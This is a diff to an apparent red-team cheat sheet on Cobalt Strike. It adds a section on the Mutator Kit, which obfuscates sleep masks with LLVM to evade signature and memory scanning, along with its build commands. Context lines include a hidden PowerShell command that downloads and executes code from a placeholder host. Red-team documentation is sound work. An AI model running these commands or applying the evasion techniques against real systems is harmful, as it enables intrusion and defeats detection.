@@ -13,6 +13,7 @@ $ ./cobaltstrike
 $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
 ```
 
+
 ## Summary
 
 * [Infrastructure](#infrastructure)
@@ -39,6 +40,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Artifact Kit](#artifact-kit)
     * [Mimikatz Kit](#mimikatz-kit)
     * [Sleep Mask Kit](#sleep-mask-kit)
+    * [Mutator Kit](#mutator-kit)
     * [Thread Stack Spoofer](#thread-stack-spoofer)
 * [Beacon Object Files](#beacon-object-files)
 * [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
@@ -423,11 +425,13 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 - Build the Artifact
 - Cobalt Strike -> Script Manager > Load .cna
 
+
 ### Mimikatz Kit
 
 * Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
 * Load the mimikatz.cna aggressor script
 * Use mimikatz functions as normal
+
 
 ### Sleep Mask Kit
 
@@ -435,11 +439,25 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 
 Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.
 
+
+### Mutator Kit
+
+> The Mutator Kit, introduced by Cobalt Strike, is a tool designed to create uniquely mutated versions of a "sleep mask" used in payloads to evade detection by static signatures. It utilizes LLVM obfuscation techniques to alter the sleep mask, making it difficult for memory scanning tools to identify the mask based on predefined patterns, thereby enhancing operational security for red team activities.
+
+The OBFUSCATIONS variable can be `flattening`,`substitution`,`split-basic-blocks`,`bogus`.
+
+```ps1
+OBFUSCATIONS=substitution mutator.sh x64 -emit-llvm -S example.c -o example_with_substitutions.ll
+mutator.sh x64 -c -DIMPL_CHKSTK_MS=1 -DMASK_TEXT_SECTION=1 -o sleepmask.x64.o src49/sleepmask.c
+```
+
+
 ### Thread Stack Spoofer
 
 > An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.
 
 Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.
+
 
 ## Beacon Object Files
 
@@ -489,3 +507,4 @@ beacon> PortBender redirect 445 8445
 * [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
 * [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
 * [Cobalt Strike 4.6 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf)
+* [Introducing the Mutator Kit: Creating Object File Monstrosities with Sleep Mask and LLVM - @joehowwolf @HenriNurmi](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm)
